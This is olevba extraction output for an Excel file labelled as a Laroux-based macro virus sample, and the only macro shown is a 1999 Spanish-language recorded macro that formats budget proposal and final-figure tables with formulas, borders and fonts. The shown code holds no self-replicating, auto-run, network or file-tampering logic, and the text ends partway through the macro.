olevba 0.60.1 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Laroux-based-1a1c1663a06cfc260ee31e76f9f5361fb95c3ee048bb3f1413cd321c42beb1ad
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO Results.bas 
in file: Virus.MSExcel.Laroux-based-1a1c1663a06cfc260ee31e76f9f5361fb95c3ee048bb3f1413cd321c42beb1ad - OLE stream: '_VBA_PROJECT_CUR/VBA/Results'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

















Sub Asm_Genera()
Attribute Asm_Genera.VB_ProcData.VB_Invoke_Func = " \n14"
'
' Asm_Genera Macro
' Macro grabada el 09-21-1999 por ARMANDO
'
' Acceso directo: Ctrl+May√∫s+A
'
If Range("B3") = "" Then
    MsgBox "NO SE PUEDE EJECUTAR LA MACRO DEBIDO A QUE LA HOJA ESTA VACIA O CONTIENE UN SOLO REGISTRO"
Else
    Dim ASM As String, TEM As String, Uno As String
    Dim Dos As String, AnguloSup As String, AnguloInf As String
    Dim Suma As String, ULTIMA As String
    
    ULTIMA = CStr(Range("T2") + 7)
    ASM = CStr(Range("T2") + 6)
    TEM = CStr(Range("T2") + 6 + 2)
    Uno = CStr(Range("T2") + 6 + 6)
    Dos = CStr(Range("T2") + 6 + 7)
    AnguloSup = CStr(Range("T2") + 6 + 5)
    AnguloInf = CStr(Range("T2") + 6 + 8)
    Suma = CStr(Range("T2") + 1)
    
    Rows("1:1").Select
    Selection.Insert Shift:=xlDown
    Selection.Insert Shift:=xlDown
    Selection.Insert Shift:=xlDown
    Selection.Insert Shift:=xlDown
    Selection.Insert Shift:=xlDown
    Range("A7").Select
    Selection.Copy
    Range("B3").Select
    ActiveSheet.Paste
    Selection.Font.Bold = True
    Columns("A:A").Select
    Selection.Delete Shift:=xlToLeft
    Range("F7").Select
    'ActiveCell.FormulaR1C1 = "=RC[2]/RC[6]"
    ActiveCell.FormulaR1C1 = "=(RC[2]+RC[29])/RC[6]"
    Range("F7").Select
    Selection.Copy
    Range("F8:F" + ASM).Select
    ActiveSheet.Paste
    Range("G7").Select
    Application.CutCopyMode = False
    'ActiveCell.FormulaR1C1 = "=RC[6]*RC[-2]"
    'ActiveCell.FormulaR1C1 = "=(RC[6]+RC[7])*RC[-2]"
    ActiveCell.FormulaR1C1 = "=RC[6]*RC[-2]"
    Range("G7").Select
    Selection.Copy
    Range("G8:G" + ASM).Select
    ActiveSheet.Paste
    Range("H7").Select
    Application.CutCopyMode = False
    ActiveCell.FormulaR1C1 = "=RC[5]+RC[-1]"
    Range("H7").Select
    Selection.Copy
    Range("H8:H" + ASM).Select
    ActiveSheet.Paste
    Range("J7").Select
    Application.CutCopyMode = False
    ActiveCell.FormulaR1C1 = "=(((RC[3]*(1+RC[-5]))+RC[25])*RC[5])/(RC[2]*RC[6])"
    Range("J7").Select
    Selection.Copy
    Range("J8:J" + ASM).Select
    ActiveSheet.Paste
    Range("K7").Select
    Application.CutCopyMode = False
    ActiveCell.FormulaR1C1 = "=(((RC[2]*(1+RC[-6]))+RC[24])*RC[6])/(RC[1]*RC[7])"
    Range("K7").Select
    Selection.Copy
    Range("K8:K" + ASM).Select
    ActiveSheet.Paste
    ActiveWindow.LargeScroll ToRight:=-2
    Range("B1").Select
    Application.CutCopyMode = False
    
    'ActiveCell.FormulaR1C1 = "FASE 1"
    
    Range("E7:E" + ASM).Select
    Selection.NumberFormat = "0.0%"
    Selection.NumberFormat = "0%"
    ActiveWindow.SmallScroll ToRight:=2
    Range("F7:F" + ASM).Select
    Selection.NumberFormat = "0.0%"
    Selection.NumberFormat = "0%"
    ActiveWindow.SmallScroll ToRight:=4
    Range("I7:I" + ASM).Select
    Selection.NumberFormat = "0.0%"
    Selection.NumberFormat = "0%"
    Range("J7:J" + ASM).Select
    Selection.NumberFormat = "0.0%"
    Selection.NumberFormat = "0%"
    Range("K7:K" + ASM).Select
    Selection.NumberFormat = "0.0%"
    Selection.NumberFormat = "0%"
    Range("B6:K" + ASM).Select
    With Selection
        .HorizontalAlignment = xlGeneral
        .VerticalAlignment = xlBottom
        .Orientation = 0
        .ShrinkToFit = False
        .MergeCells = False
    End With
    With Selection
        .HorizontalAlignment = xlCenter
        .VerticalAlignment = xlBottom
        .Orientation = 0
        .ShrinkToFit = False
        .MergeCells = False
    End With
    Columns("B:K").Select
    Selection.ColumnWidth = 13.15
    Range("A7").Select
    Rows("6:6").RowHeight = 24.75
    Rows("6:6").Select
    With Selection
        .HorizontalAlignment = xlCenter
        .VerticalAlignment = xlBottom
        .WrapText = True
        .Orientation = 0
        .ShrinkToFit = False
        .MergeCells = False
    End With
    With Selection.Font
        .Size = 8
        .Strikethrough = False
        .Superscript = False
        .Subscript = False
        .OutlineFont = False
        .Shadow = False
        .Underline = xlUnderlineStyleNone
        .ColorIndex = 1
    End With
    Selection.Font.Bold = True
    Range("A6:K" + ASM).Select
    Selection.Borders(xlDiagonalDown).LineStyle = xlNone
    Selection.Borders(xlDiagonalUp).LineStyle = xlNone
    With Selection.Borders(xlEdgeLeft)
        .LineStyle = xlContinuous
        .Weight = xlMedium
        .ColorIndex = 1
    End With
    With Selection.Borders(xlEdgeTop)
        .LineStyle = xlContinuous
        .Weight = xlMedium
        .ColorIndex = 1
    End With
    With Selection.Borders(xlEdgeBottom)
        .LineStyle = xlContinuous
        .Weight = xlMedium
        .ColorIndex = 1
    End With
    With Selection.Borders(xlEdgeRight)
        .LineStyle = xlContinuous
        .Weight = xlMedium
        .ColorIndex = 1
    End With
    
  ' BORDES VERTICALES
  
    With Selection.Borders(xlInsideVertical)
        .LineStyle = xlContinuous
        .Weight = xlMedium
        .ColorIndex = 1
    End With
    Range("A7:K" + ASM).Select
    Selection.Borders(xlDiagonalDown).LineStyle = xlNone
    Selection.Borders(xlDiagonalUp).LineStyle = xlNone
    With Selection.Borders(xlEdgeLeft)
        .LineStyle = xlContinuous
        .Weight = xlThin
        .ColorIndex = 1
    End With
    With Selection.Borders(xlEdgeTop)
        .LineStyle = xlContinuous
        .Weight = xlMedium
        .ColorIndex = 1
    End With
    With Selection.Borders(xlEdgeBottom)
        .LineStyle = xlContinuous
        .Weight = xlThin
        .ColorIndex = 1
    End With
    With Selection.Borders(xlEdgeRight)
        .LineStyle = xlContinuous
        .Weight = xlThin
        .ColorIndex = 1
    End With
    With Selection.Borders(xlInsideVertical)
        .LineStyle = xlContinuous
        .Weight = xlThin
        .ColorIndex = 1
    End With
    
  '*******************
    With Selection.Borders(xlInsideHorizontal)
        .LineStyle = xlContinuous
        .Weight = xlThin
        .ColorIndex = 1
    End With
    Range("B2").Select
    Range("A7:K" + ASM).Select
    With Selection.Font
        .Name = "Arial"
        .Size = 9
        .Strikethrough = False
        .Superscript = False
        .Subscript = False
        .OutlineFont = False
        .Shadow = False
        .Underline = xlUnderlineStyleNone
        .ColorIndex = 1
    End With
    Range("E5").Select
    ActiveCell.FormulaR1C1 = "DEFINITIVA"
    Range("E5").Select
    ActiveCell.FormulaR1C1 = "D E F I N I T I V A"
    Range("E5").Select
    With Selection.Font
        .Name = "MS Sans Serif"
        .Size = 18
        .Strikethrough = False
        .Superscript = False
        .Subscript = False
        .OutlineFont = False
        .Shadow = False
        .Underline = xlUnderlineStyleNone
        .ColorIndex = 1
    End With
    Selection.Font.Bold = True
    Range("A5:K5").Select
    Selection.Borders(xlDiagonalDown).LineStyle = xlNone
    Selection.Borders(xlDiagonalUp).LineStyle = xlNone
    With Selection.Borders(xlEdgeLeft)
        .LineStyle = xlContinuous
        .Weight = xlMedium
        .ColorIndex = 1
    End With
    With Selection.Borders(xlEdgeTop)
        .LineStyle = xlContinuous
        .Weight = xlMedium
        .ColorIndex = 1
    End With
    With Selection.Borders(xlEdgeBottom)
        .LineStyle = xlContinuous
        .Weight = xlMedium
        .ColorIndex = 1
    End With
    With Selection.Borders(xlEdgeRight)
        .LineStyle = xlContinuous
        .Weight = xlMedium
        .ColorIndex = 1
    End With
    
    'SUMA DE LOS TOTALES
    
    Selection.Borders(xlInsideVertical).LineStyle = xlNone
    Range("C6").Select
    ActiveCell.SpecialCells(xlLastCell).Select
    Range("C" + TEM).Select
    ActiveCell.FormulaR1C1 = "=SUM(R[-" + Suma + "]C:R[-1]C)"
    Range("C" + TEM).Select
    Selection.NumberFormat = "$#,##0.00"
    With Selection
        .HorizontalAlignment = xlCenter
        .VerticalAlignment = xlBottom
        .WrapText = False
        .Orientation = 0
        .ShrinkToFit = False
        .MergeCells = False
    End With
    Selection.Font.Bold = True
    Selection.Font.ColorIndex = 11
    Range("B" + TEM).Select
    ActiveCell.FormulaR1C1 = "=SUM(R[-" + Suma + "]C:R[-1]C)"
    Selection.NumberFormat = "$#,##0.00"
    With Selection
        .HorizontalAlignment = xlCenter
        .VerticalAlignment = xlBottom
        .WrapText = False
        .Orientation = 0
        .ShrinkToFit = False
        .MergeCells = False
    End With
    Selection.Font.Bold = True
    Range("G" + TEM).Select
    ActiveCell.FormulaR1C1 = "=SUM(R[-" + Suma + "]C:R[-1]C)"
    Selection.NumberFormat = "$#,##0.00"
    With Selection
        .HorizontalAlignment = xlCenter
        .VerticalAlignment = xlBottom
        .WrapText = False
        .Orientation = 0
        .ShrinkToFit = False
        .MergeCells = False
    End With
    Selection.Font.Bold = True
    Selection.Font.ColorIndex = 10
    Range("H" + TEM).Select
    ActiveCell.FormulaR1C1 = "=SUM(R[-" + Suma + "]C:R[-1]C)"
    Selection.NumberFormat = "$#,##0.00"
    With Selection
        .HorizontalAlignment = xlCenter
        .VerticalAlignment = xlBottom
        .WrapText = False
        .Orientation = 0
        .ShrinkToFit = False
        .MergeCells = False
    End With
    Selection.Font.Bold = True
    Selection.Font.ColorIndex = 10
    Columns("L:S").Select
    Selection.EntireColumn.Hidden = True
    
    'SUMATORIA DE STATUS
    
    Range("A7:C" + ASM).Select
    With Selection.Interior
        .ColorIndex = 40
        .Pattern = xlSolid
    End With
    Range("F7:K" + ASM).Select
    With Selection.Interior
        .ColorIndex = 2
        .Pattern = xlSolid
    End With
    Range("E" + Uno).Select
    ActiveCell.FormulaR1C1 = "Status"
    Selection.Font.Bold = True
    Selection.Font.ColorIndex = 2
    Range("G" + Uno).Select
    ActiveCell.FormulaR1C1 = _
        "=IF(R[-4]C>=(R[-4]C[-4]+10),""Presupuesto Excedido"",IF(R[-4]C<=(R[-4]C[-4]-10),""Falta Asignar Presupuesto"",""¬°¬° Perfecto !!""))"
    With Selection
        .HorizontalAlignment = xlCenter
        .VerticalAlignment = xlBottom
        .WrapText = False
        .Orientation = 0
        .ShrinkToFit = False
        .MergeCells = False
    End With
    Selection.Font.ColorIndex = 6
    Selection.Font.Bold = True
    
    Range("E" + Dos).Select
    ActiveCell.FormulaR1C1 = "Incremento por Asignar"
    Selection.Font.Bold = True
    Selection.Font.ColorIndex = 2
    Range("G" + Dos).Select
    ActiveCell.FormulaR1C1 = "=R[-5]C[-4]-R[-5]C"
    With Selection
        .HorizontalAlignment = xlCenter
        .VerticalAlignment = xlBottom
        .WrapText = False
        .Orientation = 0
        .ShrinkToFit = False
        .MergeCells = False
    End With
    Selection.Font.ColorIndex = 6
    Selection.Font.Bold = True
    
    Range("D" + AnguloSup + ":H" + AnguloInf).Select
    Selection.Borders(xlDiagonalDown).LineStyle = xlNone
    Selection.Borders(xlDiagonalUp).LineStyle = xlNone
    With Selection.Borders(xlEdgeLeft)
        .LineStyle = xlContinuous
        .Weight = xlMedium
        .ColorIndex = xlAutomatic
    End With
    With Selection.Borders(xlEdgeTop)
        .LineStyle = xlContinuous
        .Weight = xlMedium
        .ColorIndex = xlAutomatic
    End With
    With Selection.Borders(xlEdgeBottom)
        .LineStyle = xlContinuous
        .Weight = xlMedium
        .ColorIndex = xlAutomatic
    End With
    With Selection.Borders(xlEdgeRight)
        .LineStyle = xlContinuous
        .Weight = xlMedium
        .ColorIndex = xlAutomatic
    End With
    
    With Selection.Interior
        .ColorIndex = 41
        .Pattern = xlSolid
    End With
    
  '**************************************************************
  ' SEGUNDA PARTE
  '**************************************************************
  
    ActiveWindow.SmallScroll ToRight:=7
    Columns("U:V").Select
    Selection.Cut
    ActiveWindow.LargeScroll ToRight:=-1
    ActiveWindow.SmallScroll ToRight:=-1
    Columns("C:C").Select
    Selection.Insert Shift:=xlToRight
    Range("C6:D" + ASM).Select
    Selection.Borders(xlDiagonalDown).LineStyle = xlNone
    Selection.Borders(xlDiagonalUp).LineStyle = xlNone
    With Selection.Borders(xlEdgeLeft)
        .LineStyle = xlContinuous
        .Weight = xlMedium
        .ColorIndex = 1
    End With
    With Selection.Borders(xlEdgeTop)
        .LineStyle = xlContinuous
        .Weight = xlMedium
        .ColorIndex = 1
    End With
    With Selection.Borders(xlEdgeBottom)
        .LineStyle = xlContinuous
        .Weight = xlMedium
        .ColorIndex = 1
    End With
    With Selection.Borders(xlEdgeRight)
        .LineStyle = xlContinuous
        .Weight = xlMedium
        .ColorIndex = 1
    End With
    With Selection.Borders(xlInsideVertical)
        .LineStyle = xlContinuous
        .Weight = xlMedium
        .ColorIndex = 1
    End With
    Range("C7:C" + ASM).Select
    Selection.NumberFormat = "$#,##0"
    With Selection
        .HorizontalAlignment = xlCenter
        .VerticalAlignment = xlBottom
        .WrapText = True
        .Orientation = 0
        .ShrinkToFit = False
        .MergeCells = False
    End With
    Range("D7:D" + ASM).Select
    Selection.Style = "Percent"
    With Selection
        .HorizontalAlignment = xlCenter
        .VerticalAlignment = xlBottom
        .WrapText = True
        .Orientation = 0
        .ShrinkToFit = False
        .MergeCells = False
    End With
    Range("C7:D" + ASM).Select
    Selection.Borders(xlDiagonalDown).LineStyle = xlNone
    Selection.Borders(xlDiagonalUp).LineStyle = xlNone
    With Selection.Borders(xlEdgeLeft)
        .LineStyle = xlContinuous
        .Weight = xlThin
        .ColorIndex = 1
    End With
    With Selection.Borders(xlEdgeTop)
        .LineStyle = xlContinuous
        .Weight = xlMedium
        .ColorIndex = 1
    End With
    With Selection.Borders(xlEdgeBottom)
        .LineStyle = xlContinuous
        .Weight = xlThin
        .ColorIndex = 1
    End With
    With Selection.Borders(xlEdgeRight)
        .LineStyle = xlContinuous
        .Weight = xlThin
        .ColorIndex = 1
    End With
    With Selection.Borders(xlInsideVertical)
        .LineStyle = xlContinuous
        .Weight = xlThin
        .ColorIndex = 1
    End With
    With Selection.Borders(xlInsideHorizontal)
        .LineStyle = xlContinuous
        .Weight = xlThin
        .ColorIndex = 1
    End With
    Columns("C:D").Select
    Selection.ColumnWidth = 13.14
    Range("C5:D5").Select
    Selection.Borders(xlDiagonalDown).LineStyle = xlNone
    Selection.Borders(xlDiagonalUp).LineStyle = xlNone
    Selection.Borders(xlEdgeLeft).LineStyle = xlNone
    With Selection.Borders(xlEdgeTop)
        .LineStyle = xlContinuous
        .Weight = xlMedium
        .ColorIndex = 1
    End With
    With Selection.Borders(xlEdgeBottom)
        .LineStyle = xlContinuous
        .Weight = xlMedium
        .ColorIndex = 1
    End With
    Selection.Borders(xlEdgeRight).LineStyle = xlNone
    Selection.Borders(xlInsideVertical).LineStyle = xlNone
    Range("B5").Select
    ActiveWindow.SmallScroll ToRight:=1
    Columns("F:F").Select
    Selection.Insert Shift:=xlToRight
    Columns("F:F").Select
    Selection.Borders(xlDiagonalDown).LineStyle = xlNone
    Selection.Borders(xlDiagonalUp).LineStyle = xlNone
    Selection.Borders(xlEdgeTop).LineStyle = xlNone
    Selection.Borders(xlEdgeBottom).LineStyle = xlNone
    Selection.Borders(xlInsideHorizontal).LineStyle = xlNone
    Columns("F:F").Select
    With Selection.Interior
        .ColorIndex = 2
        .Pattern = xlSolid
    End With
    Range("E5").Select
    Selection.Borders(xlDiagonalDown).LineStyle = xlNone
    Selection.Borders(xlDiagonalUp).LineStyle = xlNone
    Selection.Borders(xlEdgeLeft).LineStyle = xlNone
    With Selection.Borders(xlEdgeTop)
        .LineStyle = xlContinuous
        .Weight = xlMedium
        .ColorIndex = 1
    End With
    With Selection.Borders(xlEdgeBottom)
        .LineStyle = xlContinuous
        .Weight = xlMedium
        .ColorIndex = 1
    End With
    With Selection.Borders(xlEdgeRight)
        .LineStyle = xlContinuous
        .Weight = xlMedium
        .ColorIndex = 1
    End With
    Range("G5").Select
    Selection.Borders(xlDiagonalDown).LineStyle = xlNone
    Selection.Borders(xlDiagonalUp).LineStyle = xlNone
    With Selection.Borders(xlEdgeLeft)
        .LineStyle = xlContinuous
        .Weight = xlMedium
        .ColorIndex = 1
    End With
    With Selection.Borders(xlEdgeTop)
        .LineStyle = xlContinuous
        .Weight = xlMedium
        .ColorIndex = 1
    End With
    With Selection.Borders(xlEdgeBottom)
        .LineStyle = xlContinuous
        .Weight = xlMedium
        .ColorIndex = 1
    End With
    Selection.Borders(xlEdgeRight).LineStyle = xlNone
    ActiveWindow.SmallScroll ToRight:=4
    Range("H5").Select
    Selection.Cut Destination:=Range("I5")
    Range("I5").Select
    Selection.Cut Destination:=Range("J5")
    Range("H5:I5").Select
    Selection.Borders(xlDiagonalDown).LineStyle = xlNone
    Selection.Borders(xlDiagonalUp).LineStyle = xlNone
    Selection.Borders(xlEdgeLeft).LineStyle = xlNone
    With Selection.Borders(xlEdgeTop)
        .LineStyle = xlContinuous
        .Weight = xlMedium
        .ColorIndex = 1
    End With
    With Selection.Borders(xlEdgeBottom)
        .LineStyle = xlContinuous
        .Weight = xlMedium
        .ColorIndex = 1
    End With
    Selection.Borders(xlEdgeRight).LineStyle = xlNone
    Selection.Borders(xlInsideVertical).LineStyle = xlNone
    Range("J5").Select
    ActiveWindow.SmallScroll ToRight:=-5
    Range("B5").Select
    ActiveCell.FormulaR1C1 = "PROPUESTA"
    Range("B5").Select
    ActiveCell.FormulaR1C1 = "P R O P U E S T A"
    Range("B5").Select
    Selection.Font.Bold = True
    With Selection.Font
        .Name = "MS Sans Serif"
        .Size = 18
        .Strikethrough = False
        .Superscript = False
        .Subscript = False
        .OutlineFont = False
        .Shadow = False
        .Underline = xlUnderlineStyleNone
        .ColorIndex = 1
    End With
    Range("C16").Select
    ActiveWindow.SmallScroll ToRight:=8
    Columns("W:W").Select
    Selection.EntireColumn.Hidden = True
    ActiveWindow.LargeScroll ToRight:=-1
    ActiveWindow.SmallScroll ToRight:=-1
    Range("C7:D" + ASM).Select
    With Selection.Interior
        .ColorIndex = 40
        .Pattern = xlSolid
    End With
    With Selection.Font
        .Name = "Arial"
        .Size = 9
        .Strikethrough = False
        .Superscript = False
        .Subscript = False
        .OutlineFont = False
        .Shadow = False
        .Underline = xlUnderlineStyleNone
        .ColorIndex = 1
    End With
    Range("E7:E" + ASM).Select
    Selection.NumberFormat = "$#,##0"
    Range("C" + TEM).Select
    ActiveCell.FormulaR1C1 = "=SUM(R[-" + Suma + "]C:R[-1]C)"
    Range("C" + TEM).Select
    With Selection
        .HorizontalAlignment = xlCenter
        .VerticalAlignment = xlBottom
        .WrapText = False
        .Orientation = 0
        .ShrinkToFit = False
        .MergeCells = False
    End With
    Selection.Font.Bold = True
    Selection.Font.ColorIndex = 11
    Range("C16").Select

'************************************************************
'   TERCERA PARTE
'************************************************************}
   
   Range("A5:E5").Select
    With Selection.Interior
        .ColorIndex = 11
        .Pattern = xlSolid
    End With
    Selection.Font.ColorIndex = 2
    Range("D17").Select
    ActiveWindow.SmallScroll ToRight:=2
    Range("G5:N5").Select
    With Selection.Interior
        .ColorIndex = 11
        .Pattern = xlSolid
    End With
    Selection.Font.ColorIndex = 2
    Columns("F:F").Select
    Range("F3").Activate
    Range("F13").Select
 Range("A3").Select
    Selection.Cut
    Range("E2").Select
    ActiveSheet.Paste
    Range("E2:F2").Select
    With Selection
        .HorizontalAlignment = xlCenter
        .VerticalAlignment = xlBottom
        .Orientation = 0
        .ShrinkToFit = False
        .MergeCells = False
    End With
    Selection.Merge
    With Selection.Font
        .Name = "Arial"
        .Size = 14
        .Strikethrough = False
        .Superscript = False
        .Subscript = False
        .OutlineFont = False
        .Shadow = False
        .Underline = xlUnderlineStyleNone
        .ColorIndex = 1
    End With
    Selection.Font.ColorIndex = 3
    Selection.Borders(xlDiagonalDown).LineStyle = xlNone
    Selection.Borders(xlDiagonalUp).LineStyle = xlNone
    With Selection.Borders(xlEdgeLeft)
        .LineStyle = xlContinuous
        .Weight = xlMedium
        .ColorIndex = 1
    End With
    With Selection.Borders(xlEdgeTop)
        .LineStyle = xlContinuous
        .Weight = xlMedium
        .ColorIndex = 1
    End With
    With Selection.Borders(xlEdgeBottom)
        .LineStyle = xlContinuous
        .Weight = xlMedium
        .ColorIndex = 1
    End With
    With Selection.Borders(xlEdgeRight)
        .LineStyle = xlContinuous
        .Weight = xlMedium
        .ColorIndex = 1
    End With
    Selection.Borders(xlInsideVertical).LineStyle = xlNone
    With Selection
        .HorizontalAlignment = xlCenter
        .VerticalAlignment = xlCenter
        .WrapText = True
        .Orientation = 0
        .ShrinkToFit = False
        .MergeCells = True
    End With

'*************************************************************+
' Ultima parte Encabezado columnas
'**************************************************************
Range("I7:N" + ASM).Select
    Selection.Interior.ColorIndex = 40
    Range("I15").Select
    ActiveWindow.LargeScroll ToRight:=-2
    Rows("1:1").Select
    Selection.Insert Shift:=xlDown
    Rows("7:7").Select
    Selection.Copy
    Rows("1:1").Select
    ActiveSheet.Paste
    Range("F1").Select
    Application.CutCopyMode = False
    ActiveCell.FormulaR1C1 = "vacio"
    With ActiveCell.Characters(Start:=1, Length:=5).Font
        .Name = "Arial"
        .FontStyle = "Negrita"
        .Size = 8
        .Strikethrough = False
        .Superscript = False
        .Subscript = False
        .OutlineFont = False
        .Shadow = False
        .Underline = xlUnderlineStyleNone
        .ColorIndex = 1
    End With
    Rows("1:1").Select
    Range("B1").Activate
    Selection.EntireRow.Hidden = True
    Range("J8:J" + TEM).Select
    Selection.NumberFormat = "$#,##0"
    Range("H8").Select
    

'TTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTT
  ActiveWindow.SmallScroll ToRight:=16
    Columns("AK:AK").Select
    Range("AK2").Activate
    Selection.Cut
    Columns("C:C").Select
    Range("C2").Activate
    Selection.Insert Shift:=xlToRight
    Columns("Y:AG").Select
    Range("Y2").Activate
    Selection.Cut
    Columns("C:C").Select
    Range("C2").Activate
    Selection.Insert Shift:=xlToRight
    Selection.ColumnWidth = 13.14
    ActiveWindow.SmallScroll ToRight:=2
    Range("F19").Select
    Columns("F:F").ColumnWidth = 27
    ActiveWindow.SmallScroll ToRight:=-2
    Range("C8:K" + ULTIMA).Select
    With Selection
        .HorizontalAlignment = xlCenter
        .VerticalAlignment = xlBottom
        .WrapText = True
        .Orientation = 0
        .ShrinkToFit = False
        .MergeCells = False
    End With
    With Selection.Font
        .Name = "Arial"
        .Size = 9
        .Strikethrough = False
        .Superscript = False
        .Subscript = False
        .OutlineFont = False
        .Shadow = False
        .Underline = xlUnderlineStyleNone
        .ColorIndex = 1
    End With
    Selection.Borders(xlDiagonalDown).LineStyle = xlNone
    Selection.Borders(xlDiagonalUp).LineStyle = xlNone
    With Selection.Borders(xlEdgeLeft)
        .LineStyle = xlContinuous
        .Weight = xlThin
        .ColorIndex = 1
    End With
    With Selection.Borders(xlEdgeTop)
        .LineStyle = xlContinuous
        .Weight = xlThin
        .ColorIndex = 1
    End With
    With Selection.Borders(xlEdgeBottom)
        .LineStyle = xlContinuous
        .Weight = xlThin
        .ColorIndex = 1
    End With
    With Selection.Borders(xlEdgeRight)
        .LineStyle = xlContinuous
        .Weight = xlThin
        .ColorIndex = 1
    End With
    With Selection.Borders(xlInsideVertical)
        .LineStyle = xlContinuous
        .Weight = xlThin
        .ColorIndex = 1
    End With
    With Selection.Borders(xlInsideHorizontal)
        .LineStyle = xlContinuous
        .Weight = xlThin
        .ColorIndex = 1
    End With
    With Selection.Interior
        .ColorIndex = 40
        .Pattern = xlSolid
    End With
    Range("C7:K7").Select
    Selection.Borders(xlDiagonalDown).LineStyle = xlNone
    Selection.Borders(xlDiagonalUp).LineStyle = xlNone
    With Selection.Borders(xlEdgeLeft)
        .LineStyle = xlContinuous
        .Weight = xlMedium
        .ColorIndex = 1
    End With
    With Selection.Borders(xlEdgeTop)
        .LineStyle = xlContinuous
        .Weight = xlMedium
        .ColorIndex = 1
    End With
    With Selection.Borders(xlEdgeBottom)
        .LineStyle = xlContinuous
        .Weight = xlMedium
        .ColorIndex = 1
    End With
    With Selection.Borders(xlEdgeRight)
        .LineStyle = xlContinuous
        .Weight = xlMedium
        .ColorIndex = 1
    End With
    With Selection.Borders(xlInsideVertical)
        .LineStyle = xlContinuous
        .Weight = xlMedium
        .ColorIndex = 1
    End With
    Range("A6:K6").Select
    Selection.Borders(xlDiagonalDown).LineStyle = xlNone
    Selection.Borders(xlDiagonalUp).LineStyle = xlNone
    With Selection.Borders(xlEdgeLeft)
        .LineStyle = xlContinuous
        .Weight = xlMedium
        .ColorIndex = 1
    End With
    With Selection.Borders(xlEdgeTop)
        .LineStyle = xlContinuous
        .Weight = xlMedium
        .ColorIndex = 1
    End With
    With Selection.Borders(xlEdgeBottom)
        .LineStyle = xlContinuous
        .Weight = xlMedium
        .ColorIndex = 1
    End With
    With Selection.Borders(xlEdgeRight)
        .LineStyle = xlContinuous
        .Weight = xlMedium
        .ColorIndex = 1
    End With
    Selection.Borders(xlInsideVertical).LineStyle = xlNone
    Selection.Interior.ColorIndex = 11
    Range("B6").Select
    Selection.ClearContents
    Range("D6").Select
    ActiveWindow.SmallScroll ToRight:=3
    Range("E6").Select
    ActiveCell.FormulaR1C1 = "A C T U A L"
    Range("E6").Select
    Selection.Font.Bold = True
    With Selection.Font
        .Name = "MS Sans Serif"
        .Size = 18
        .Strikethrough = False
        .Superscript = False
        .Subscript = False
        .OutlineFont = False
        .Shadow = False
        .Underline = xlUnderlineStyleNone
        .ColorIndex = 1
    End With
    Selection.Font.ColorIndex = 2
    ActiveWindow.SmallScroll ToRight:=5
   Range("O3:T3").Select
    ActiveWindow.SmallScroll ToRight:=1
    With Selection
        .HorizontalAlignment = xlCenter
        .VerticalAlignment = xlCenter
        .WrapText = False
        .Orientation = 0
        .ShrinkToFit = False
        .MergeCells = False
    End With
    Columns("AH:AJ").Select
    Range("AH2").Activate
    Selection.Cut
    Columns("P:P").Select
    Range("P2").Activate
    Selection.Insert Shift:=xlToRight
    Range("P8:R" + ULTIMA).Select
    With Selection
        .HorizontalAlignment = xlCenter
        .VerticalAlignment = xlBottom
        .WrapText = True
        .Orientation = 0
        .ShrinkToFit = False
        .MergeCells = False
    End With
    Selection.Style = "Percent"
    With Selection.Font
        .Name = "Arial"
        .Size = 9
        .Strikethrough = False
        .Superscript = False
        .Subscript = False
        .OutlineFont = False
        .Shadow = False
        .Underline = xlUnderlineStyleNone
        .ColorIndex = 1
    End With
    Selection.Borders(xlDiagonalDown).LineStyle = xlNone
    Selection.Borders(xlDiagonalUp).LineStyle = xlNone
    With Selection.Borders(xlEdgeLeft)
        .LineStyle = xlContinuous
        .Weight = xlThin
        .ColorIndex = 1
    End With
    With Selection.Borders(xlEdgeTop)
        .LineStyle = xlContinuous
        .Weight = xlThin
        .ColorIndex = 1
    End With
    With Selection.Borders(xlEdgeBottom)
        .LineStyle = xlContinuous
        .Weight = xlThin
        .ColorIndex = 1
    End With
    With Selection.Borders(xlEdgeRight)
        .LineStyle = xlContinuous
        .Weight = xlThin
        .ColorIndex = 1
    End With
    With Selection.Borders(xlInsideVertical)
        .LineStyle = xlContinuous
        .Weight = xlThin
        .ColorIndex = 1
    End With
    With Selection.Borders(xlInsideHorizontal)
        .LineStyle = xlContinuous
        .Weight = xlThin
        .ColorIndex = 1
    End With
    With Selection.Interior
        .ColorIndex = 11
        .Pattern = xlSolid
    End With
    Selection.Interior.ColorIndex = 40
    Range("P7:R7").Select
    Selection.Borders(xlDiagonalDown).LineStyle = xlNone
    Selection.Borders(xlDiagonalUp).LineStyle = xlNone
    With Selection.Borders(xlEdgeLeft)
        .LineStyle = xlContinuous
        .Weight = xlMedium
        .ColorIndex = 1
    End With
    With Selection.Borders(xlEdgeTop)
        .LineStyle = xlContinuous
        .Weight = xlMedium
        .ColorIndex = 1
    End With
    With Selection.Borders(xlEdgeBottom)
        .LineStyle = xlContinuous
        .Weight = xlMedium
        .ColorIndex = 1
    End With
    With Selection.Borders(xlEdgeRight)
        .LineStyle = xlContinuous
        .Weight = xlMedium
        .ColorIndex = 1
    End With
    With Selection.Borders(xlInsideVertical)
        .LineStyle = xlContinuous
        .Weight = xlMedium
        .ColorIndex = 1
    End With
    ActiveWindow.SmallScroll ToRight:=-2
    Range("M6:R6").Select
    Selection.Borders(xlDiagonalDown).LineStyle = xlNone
    Selection.Borders(xlDiagonalUp).LineStyle = xlNone
    With Selection.Borders(xlEdgeLeft)
        .LineStyle = xlContinuous
        .Weight = xlMedium
        .ColorIndex = 1
    End With
    With Selection.Borders(xlEdgeTop)
        .LineStyle = xlContinuous
        .Weight = xlMedium
        .ColorIndex = 1
    End With
    With Selection.Borders(xlEdgeBottom)
        .LineStyle = xlContinuous
        .Weight = xlMedium
        .ColorIndex = 1
    End With
    With Selection.Borders(xlEdgeRight)
        .LineStyle = xlContinuous
        .Weight = xlMedium
        .ColorIndex = 1
    End With
    Selection.Borders(xlInsideVertical).LineStyle = xlNone
    Selection.Interior.ColorIndex = 6
    Range("M6:R6").Select
    Selection.Interior.ColorIndex = 11
    Range("O6").Select
    ActiveCell.FormulaR1C1 = "P R O P U E S T A"
    Range("O6").Select
    Selection.Font.ColorIndex = 2
    Selection.Font.Bold = True
    With Selection.Font
        .Name = "MS Sans Serif"
        .Size = 18
        .Strikethrough = False
        .Superscript = False
